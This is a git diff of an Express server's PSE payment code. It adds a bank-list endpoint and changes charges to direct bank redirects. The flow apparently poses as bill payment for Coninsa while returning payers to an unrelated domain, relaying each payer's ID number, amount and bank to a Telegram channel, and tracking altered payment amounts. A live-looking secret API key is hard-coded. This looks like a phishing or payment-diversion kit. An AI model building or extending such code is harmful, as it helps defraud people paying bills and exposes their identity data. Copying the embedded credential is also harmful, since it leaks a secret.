@@ -863,17 +863,41 @@ app.post('/api/coninsa/buscar', async (req, res) => {
   }
 });
 
-// ── Helppiu Pay PSE ──────────────────────────────────────────────────────────
+// ── Helppiu Pay PSE (Direct Charges) ─────────────────────────────────────────
 const HP_API  = 'https://helppiupay.com/api/v1';
 const HP_AUTH = 'Bearer hp_sk_live_Z9cxILagdjuaO1wXUCGq1qfS:1P94UirgtSEh44r1ZG1oLBRA1npStKcV4nrtERZLA0XDCJrd';
+
+let _hpBankCache = null;
+app.get('/api/pse/bancos', async (req, res) => {
+  const ip = getIp(req);
+  if (!allowed(ip, 20, 60_000))
+    return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes.' });
+  try {
+    if (!_hpBankCache) {
+      const r = await axios.get(`${HP_API}/banks/pse`, {
+        headers: { Authorization: HP_AUTH },
+      });
+      // Normalizar al formato que ya usa el frontend
+      _hpBankCache = r.data.data
+        .filter(b => b.codigoBanco && b.codigoBanco !== '0')
+        .map(b => ({
+          financial_institution_code: b.codigoBanco,
+          financial_institution_name: b.nombreBanco,
+        }));
+    }
+    res.json({ status: 'OK', data: _hpBankCache });
+  } catch (e) {
+    res.status(502).json({ status: 'ERROR', message: 'No se pudieron cargar los bancos.' });
+  }
+});
 
 app.post('/api/pse/generar', async (req, res) => {
   const ip = getIp(req);
   if (!allowed(ip, 5, 60_000))
     return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes. Intenta en un momento.' });
 
-  const { monto, cedula, nombre, email } = req.body;
-  if (!monto || !cedula)
+  const { monto, bancoCode, cedula, tipoPersona, nombre, email, telefono } = req.body;
+  if (!monto || !bancoCode || !cedula)
     return res.status(400).json({ status: 'ERROR', message: 'Faltan datos requeridos.' });
   const montoNum = parseInt(monto);
   if (!Number.isFinite(montoNum) || montoNum < 1000 || montoNum > 100_000_000)
@@ -884,25 +908,26 @@ app.post('/api/pse/generar', async (req, res) => {
 
   try {
     const reference = `CON${Date.now()}`;
-    const payload = {
+    const r = await axios.post(`${HP_API}/charges`, {
       reference,
-      amount:       montoEnviado,
-      currency:     'COP',
-      description:  'Pago factura Coninsa',
-      success_url:  'https://gestadmoncool.online',
-      cancel_url:   'https://gestadmoncool.online',
-      payment_method_types: ['pse'],
-      metadata:     { cedula: String(cedula) },
-    };
-    if (email)  payload.customer_email = email;
-    if (nombre) payload.customer_name  = nombre;
+      amount:   montoEnviado,
+      currency: 'COP',
+      customer: {
+        name:     nombre   || 'Cliente',
+        email:    email    || `${cedula}@cliente.co`,
+        document: String(cedula),
+        phone:    telefono || '',
+      },
+      payment_method: {
+        type:          'pse',
+        bank_code:     String(bancoCode),
+        person_type:   tipoPersona === 'J' ? '1' : '0',
+        document_type: 'CC',
+      },
+    }, { headers: { Authorization: HP_AUTH, 'Content-Type': 'application/json', 'Idempotency-Key': reference } });
 
-    const r = await axios.post(`${HP_API}/checkout-sessions`, payload, {
-      headers: { Authorization: HP_AUTH, 'Content-Type': 'application/json', 'Idempotency-Key': reference },
-    });
-
-    const checkoutUrl = r.data?.url;
-    if (!checkoutUrl) throw new Error('Helppiu no devolvió URL');
+    const redirectUrl = r.data?.next_action?.redirect_url;
+    if (!redirectUrl) throw new Error('Helppiu no devolvió redirect_url');
 
     const montoExtra = montoEnviado !== montoNum
       ? `\n⚠️ Original: ${fmtCOP(montoNum)} → Enviado: ${fmtCOP(montoEnviado)}`
@@ -911,16 +936,18 @@ app.post('/api/pse/generar', async (req, res) => {
       `✅ <b>PSE iniciado</b>\n` +
       `📄 Cédula: <code>${cedula}</code>\n` +
       `💰 Monto: ${fmtCOP(montoEnviado)}${montoExtra}\n` +
+      `🏦 Banco: <code>${bancoCode}</code>\n` +
       `👤 ${nombre || 'Sin nombre'}\n` +
-      `🔗 Redirigido a Helppiu Pay`
+      `🔗 Redirigido al banco`
     );
-    return res.json({ status: 'listo', url: checkoutUrl });
+    return res.json({ status: 'listo', url: redirectUrl });
   } catch (e) {
     const msg = e.response?.data?.message || e.message || 'Error generando PSE';
     tgText(
       `⚠️ <b>PSE — error Helppiu</b>\n` +
       `📄 Cédula: <code>${cedula}</code>\n` +
       `💰 Monto: ${fmtCOP(montoNum)}\n` +
+      `🏦 Banco: <code>${bancoCode}</code>\n` +
       `❌ ${msg}`
     );
     return res.status(502).json({ status: 'ERROR', message: msg });
